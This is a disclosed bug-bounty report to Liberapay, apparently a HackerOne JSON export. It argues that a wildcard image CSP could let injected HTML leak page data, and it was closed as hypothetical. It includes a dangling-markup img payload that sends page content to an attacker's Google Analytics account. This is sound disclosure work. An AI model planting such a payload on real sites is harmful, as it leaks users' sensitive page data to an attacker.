{"id":360864,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNjA4NjQ=","url":"https://hackerone.com/reports/360864","title":"Current CSP Policy chained with HTML Injection can lead to Data Exfiltration","state":"Closed","substate":"informative","severity_rating":"none","readable_substate":"Informative","created_at":"2018-06-01T17:25:20.828Z","submitted_at":"2018-06-01T17:25:20.828Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"pwnisher","url":"/pwnisher","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/007/834/cb8dfbf20e924397f137df7bae89c1fd7160903c_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":28411,"url":"https://hackerone.com/liberapay","handle":"liberapay","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/028/411/c0a012abdcef38b417e29616505b1a3b4ed87b81_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/028/411/c0a012abdcef38b417e29616505b1a3b4ed87b81_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Liberapay","twitter_handle":"liberapay","website":"https://liberapay.com","about":"An open source platform designed to facilitate recurrent donations."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2018-06-04T11:52:36.945Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2018-06-02T13:02:19.030Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi Team,\n\n#### Summary\nWhile reviewing the CSP headers for en.liberapay.com i noticed that img-src has a source set to * which means any source on the internet. The following is found in the current CSP Header config.\n\n```img-src * blob: data:```\n\n### Description:\nIf the site is vulnerable to HTML Injection its possible to use sources like www.google-analytics.com and inject a malicious html like the below\n\n```html\n\u003cimg src='https://www.google-analytics.com/collect?v=1\u0026tid=UA-55300588-1\u0026cid=3121525717\u0026t=event\u0026ec=email\u0026el=2111515817\u0026cs=newsletter\u0026cm=email\u0026cn=062413\u0026cm1=1\u0026ea=\n```\nIf you notice the injected img src attribute i dint close the tag, so eventually a tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages. If a victim opens any such injected page, his information from the html response will be send to attackers google-analytics account as a get request due to the injected \u003cimg src\u003e tag. Attacker can login into his analytics account and review all log event actions and he will have the html responses of all the victims visited.\n\n### Mitigation:\nIf you feel that the site doesn't need to load images from google-analytics, remove the google-analytics from the img-src attribute of the CSP. Alternatively if you feel you need it then It is recommended to remove google-analytics from the img-src attribute and use it on connect-src and use XHR based approach - (https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms)\n\n\n### References:\nGithub  https://githubengineering.com/githubs-post-csp-journey\nHackerone  https://hackerone.com/reports/199779\nDetectify (good explanation)  https://labs.detectify.com/2018/01/19/google-analytics-data-extraction\n\n## Impact\n\nThis CSP bypass vector can be used to leverage attacks like sensitive data-exfiltration , cross site script include resulting in malicious java-script execution etc.\n\nRegards,\nNthack","vulnerability_information_html":"\u003cp\u003eHi Team,\u003c/p\u003e\n\n\u003ch4 id=\"summary\"\u003eSummary\u003c/h4\u003e\n\n\u003cp\u003eWhile reviewing the CSP headers for en.liberapay.com i noticed that img-src has a source set to * which means any source on the internet. The following is found in the current CSP Header config.\u003c/p\u003e\n\n\u003cp\u003e\u003ccode\u003eimg-src * blob: data:\u003c/code\u003e\u003c/p\u003e\n\n\u003ch3 id=\"description\"\u003eDescription:\u003c/h3\u003e\n\n\u003cp\u003eIf the site is vulnerable to HTML Injection its possible to use sources like \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.google-analytics.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.google-analytics.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e and inject a malicious html like the below\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;img\u003c/span\u003e \u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;https://www.google-analytics.com/collect?v=1\u0026amp;tid=UA-55300588-1\u0026amp;cid=3121525717\u0026amp;t=event\u0026amp;ec=email\u0026amp;el=2111515817\u0026amp;cs=newsletter\u0026amp;cm=email\u0026amp;cn=062413\u0026amp;cm1=1\u0026amp;ea=\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIf you notice the injected img src attribute i dint close the tag, so eventually a tag with an unclosed quote will capture all output up to the next matching quote. This could include security sensitive content on pages. If a victim opens any such injected page, his information from the html response will be send to attackers google-analytics account as a get request due to the injected \u0026lt;img src\u0026gt; tag. Attacker can login into his analytics account and review all log event actions and he will have the html responses of all the victims visited.\u003c/p\u003e\n\n\u003ch3 id=\"mitigation\"\u003eMitigation:\u003c/h3\u003e\n\n\u003cp\u003eIf you feel that the site doesn\u0026#39;t need to load images from google-analytics, remove the google-analytics from the img-src attribute of the CSP. Alternatively if you feel you need it then It is recommended to remove google-analytics from the img-src attribute and use it on connect-src and use XHR based approach - (\u003ca title=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms\" href=\"/redirect?url=https%3A%2F%2Fdevelopers.google.com%2Fanalytics%2Fdevguides%2Fcollection%2Fanalyticsjs%2Fsending-hits%23specifying_different_transport_mechanisms\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://developers.google.com/analytics/devguides/collection/analyticsjs/sending-hits#specifying_different_transport_mechanisms\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e)\u003c/p\u003e\n\n\u003ch3 id=\"references\"\u003eReferences:\u003c/h3\u003e\n\n\u003cp\u003eGithub  \u003ca title=\"https://githubengineering.com/githubs-post-csp-journey\" href=\"/redirect?url=https%3A%2F%2Fgithubengineering.com%2Fgithubs-post-csp-journey\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://githubengineering.com/githubs-post-csp-journey\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nHackerone  \u003ca title=\"https://hackerone.com/reports/199779\" href=\"https://hackerone.com/reports/199779\"\u003ehttps://hackerone.com/reports/199779\u003c/a\u003e\u003cbr\u003e\nDetectify (good explanation)  \u003ca title=\"https://labs.detectify.com/2018/01/19/google-analytics-data-extraction\" href=\"/redirect?url=https%3A%2F%2Flabs.detectify.com%2F2018%2F01%2F19%2Fgoogle-analytics-data-extraction\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://labs.detectify.com/2018/01/19/google-analytics-data-extraction\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis CSP bypass vector can be used to leverage attacks like sensitive data-exfiltration , cross site script include resulting in malicious java-script execution etc.\u003c/p\u003e\n\n\u003cp\u003eRegards,\u003cbr\u003e\nNthack\u003c/p\u003e\n","weakness":{"id":57,"name":"Violation of Secure Design Principles"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":1,"voters":["0x08"],"severity":{"rating":"none","author_type":"Team"},"structured_scope":{"databaseId":8926,"asset_type":"URL","asset_identifier":"*.liberapay.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":2830222,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Would it be possible to provide us with a proof of concept on liberapay.com that demonstrates HTML injection which abuses this potential issue? Without the HTML injection and a clear proof of concept, this report is purely hypothetical.","markdown_message":"\u003cp\u003eWould it be possible to provide us with a proof of concept on liberapay.com that demonstrates HTML injection which abuses this potential issue? Without the HTML injection and a clear proof of concept, this report is purely hypothetical.\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-01T17:33:30.981Z","updated_at":"2018-06-01T17:33:30.981Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"liberapay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2830235,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"As of now, i dont have a HTML Injection, so yeah if you feel its purely hypothetical it can be closed as Informative.\n\nThanks\nNthack","markdown_message":"\u003cp\u003eAs of now, i dont have a HTML Injection, so yeah if you feel its purely hypothetical it can be closed as Informative.\u003c/p\u003e\n\n\u003cp\u003eThanks\u003cbr\u003e\nNthack\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-01T17:36:31.876Z","updated_at":"2018-06-01T17:36:31.876Z","actor":{"username":"pwnisher","cleared":false,"url":"/pwnisher","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/007/834/cb8dfbf20e924397f137df7bae89c1fd7160903c_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"liberapay","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2830246,"is_internal":false,"editable":false,"type":"Activities::BugInformative","message":"Closing this report as informative so as not to affect your reputation. If you manage to exploit this, please do report back and I will take another look at your report. Keep up the good work, @nthack!","markdown_message":"\u003cp\u003eClosing this report as informative so as not to affect your reputation. If you manage to exploit this, please do report back and I will take another look at your report. Keep up the good work, \u003ca href=\"/nthack\"\u003e@nthack\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2018-06-01T17:38:31.971Z","updated_at":"2018-06-01T17:38:31.971Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"liberapay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2833069,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-02T13:02:14.641Z","updated_at":"2018-06-02T13:02:14.641Z","additional_data":{"old_severity":"Low","new_severity":"None","old_severity_id":162748,"new_severity_id":162945},"actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"liberapay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2833070,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-02T13:02:19.064Z","updated_at":"2018-06-02T13:02:19.064Z","first_to_agree":true,"actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"liberapay","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2838557,"is_internal":false,"editable":false,"type":"Activities::ManuallyDisclosed","message":"","markdown_message":"","automated_response":false,"created_at":"2018-06-04T11:52:36.879Z","updated_at":"2018-06-04T11:52:36.879Z","actor":{"username":"edoverflow","cleared":true,"url":"/edoverflow","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/116/374/9a3cf4d62b2f507a0d33808aacbad863ec4455ac_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"liberapay","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":7600,"category":"team","content":"In our view, this report was purely hypothetical and we would accept it if someone can demonstrate HTML injection with dangling markup.","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003eIn our view, this report was purely hypothetical and we would accept it if someone can demonstrate HTML injection with dangling markup.\u003c/p\u003e\n"},{"category":"researcher","can_view?":true,"can_create?":false}]}